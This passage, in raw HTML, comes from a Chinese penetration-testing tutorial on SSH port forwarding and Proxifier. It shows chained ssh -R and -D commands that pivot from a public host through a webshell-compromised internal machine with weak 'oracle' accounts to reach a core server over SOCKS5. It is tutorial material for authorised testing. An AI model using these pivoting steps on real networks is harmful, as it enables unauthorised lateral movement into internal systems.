620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">远端映射</strong>(使用-R选项)，将一个远端服务器的端口，隐射到另一个远端服务器。</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -R 3307:192.168.202.244:3306 root@192.168.201.100<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">这个时候，执行这条命令的主机，就成为跳板机。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">前提：执行这条命令的主机，必须同时能够访问SSH Server和Target Server。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">场景：SSH Server在外部，跳板机在内网，Target Host和跳板机同网段但无法</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">直接从互联网访问到，或者Target Host处在更深层的内网。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">实际上，本地映射、远端映射和动态隐射都可以灵活应用，跳板机、目标主机的角色是可以互相转换的。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">假设渗透测试中的一个场景如下：</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">假设，每一台服务器你都知道至少一个账户的密码，这里假设内网的服务器上都有一个弱口令的oracle账户。</span></p><table width="670"><colgroup style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"></colgroup><thead style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"><tr style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">测试人员</strong></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">公网跳板机</strong></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">内网跳板机1号</strong></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">内网跳板机2号</strong></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><strong style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;">目标主机</strong></td></tr></thead><tbody style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"><tr style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><span style="max-width: 620px;font-size: 12pt;box-sizing: border-box !important;word-wrap: break-word !important;">192.168.100.1<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />公司内网</span></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><span style="max-width: 620px;font-size: 12pt;box-sizing: border-box !important;word-wrap: break-word !important;">218.2.135.2<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />虚拟主机<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />具备独立的公网IP</span></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><span style="max-width: 620px;font-size: 12pt;box-sizing: border-box !important;word-wrap: break-word !important;">233.33.33.33<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />已Getshell<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />不能从外部直接登陆<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />但可以访问互联网</span></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><span style="max-width: 620px;font-size: 12pt;box-sizing: border-box !important;word-wrap: break-word !important;">192.168.100.100<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />内网主机<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />不能访问互联网<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />可以被跳板1号访问</span></td><td style="padding: 0px;word-break: break-all;max-width: 620px;text-align: left;word-wrap: break-word !important;box-sizing: border-box !important;"><span style="max-width: 620px;font-size: 12pt;box-sizing: border-box !important;word-wrap: break-word !important;">10.10.10.2<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />核心服务器<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />可被跳板机2号访问<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  />能够访问核心区域</span></td></tr></tbody></table><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">第一步：登陆公网跳板机</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh root@218.2.135.2<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">第二步：把218.2.135.2的公钥，添加到跳板机1号的信任列表中。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">公钥信息，在你本地的~/.ssh/know_hosts里面可以找到</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">形如：</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">218.2.135.2 ssh-rsa AAAAB3NzaC1y**************************************************************************************************************************************************************************************************************************7/WggmJ4OYMJp0OnKQ==<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">对应的，跳板机1号上你要添加到对应账户的~/.ssh/known_hosts文件中。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">因为ssh初次登陆一台主机的时候，会询问用户，是否信任该主机。而且，如果同一个ip，其公钥与此前登陆时记录的公钥不必配，是无法登陆的，所以需要进行这个操作。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">第三部：映射跳板机2号的ssh端口，到公网跳板机上(在跳板机1号的webshell中执行)</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -f -N -R 2222:218.2.135.2:22 oracle@192.168.100.100<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);text-align: center;white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">第四部：登陆到跳板机2号上</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh oracle@localhost:2222<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">因为上一步已经将跳板机2号的22端口映射到公网跳板机上去了，这时候可以直接登陆。</span><span style="max-width: 100%;font-size:16px;line-height:36px;;line-height: 22.4px;box-sizing: border-box !important;word-wrap: break-word !important;">（注，公网跳板机也要做好防护，映射出去的端口，很有可能被扫描或者攻击，这个时候实际上被扫描的就是内网的服务器，我们不希望这种事情发生，这个时候就应当限制，2222端口只能被本地访问）</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">第五部，在跳板机2号上继续创建动态隐射</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -f -N -D 192.168.100.100:7777 oracle@10.10.10.2<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);text-align: center;white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">渗透测试中有很多变数，不能一竿子打死，只映射特定的一个端口(比如1521)。最后一跳，个人建议以动态映射的方式，这样可以保证后续的其他测试工作也能顺利进行。但如果甲方对渗透测试有特定的需求，请务必按照甲方要求的方式进行。(比如，甲方不希望你访问除10.10.10.2之外的任意服务器，那么最后一跳就做一个本地隐射就可以了)</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">第六部：在跳板机1号上执行</span></p><pre style="margin-top: 0px;margin-bottom: 0px;padding: 0px;max-width: 620px;color: rgb(62, 62, 62);font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin: 5px 10px;padding: 10px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;font-stretch: normal;line-height: normal;">ssh -f -N -R 7777:218.2.135.2:7777 oracle@192.<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />168.100.100<br style="max-width: 620px;box-sizing: border-box !important;word-wrap: break-word !important;"  /></code></pre><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">最终，打开了一个直通内网核心的SSH隧道。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">只要配置代理，sock5://218.2.135.2:7777，就可以使用浏览器或者数据库终端或者其他工具，来进行更深入的测试。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">你发送的流量，在公网跳板机上，跳板机2号上，目标主机上都会进行解密和重新加密的工作，所以效率会低很多(有点类似于洋葱路由了)。一般的手工测试或者文件传输没有太大问题，但是这个隧道一般无法支撑Namp或者WVS之类快速发包的工具。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">如果你觉得这些操作太过于繁琐，不妨试试SSH Tunnel(仅限Mac，非常值得花钱买的一个软件)。windows的话，还是一行一行敲命令吧。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><h2 style="margin: 10px auto;font-size:24px;line-height:44px;;max-width: 620px;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(0, 122, 170);box-sizing: border-box !important;word-wrap: break-word !important;"><strong style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:18px;line-height:38px;;box-sizing: border-box !important;word-wrap: break-word !important;">第二个工具：Proxifier</span></strong></span></h2><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">其实我并不是很喜欢这个工具，虽然功能强大。个人感觉配置Proxifier比配置防火墙还麻烦，所以用的很少。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);text-align: center;white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">在Proxies中添加你的代理服务器，可以配置多个代理，支持Socks4/5，HTTPS和HTTP代理。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">看到下面的ProxyChains了么？这是它非常强大的一个功能。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /></span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word !important;">其次是配置代理规则，</span><span style="max-width: 100%;font-size:16px;line-height:36px;;line-height: 22.4px;box-sizing: border-box !important;word-wrap: break-word !important;">规则中可以详细指定，什么应用，访问什么站点的时候，使用哪一条代理链路。</span></p><p style="max-width: 620px;min-height: 1em;color: rgb(62, 62, 62);white-space: normal;font family: Arial, sans-serif;font-size:14px;line-height:34px;;line-height: 22.4px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size:16px;line-height:36px;;box-sizing: border-box !important;word-wrap: break-word 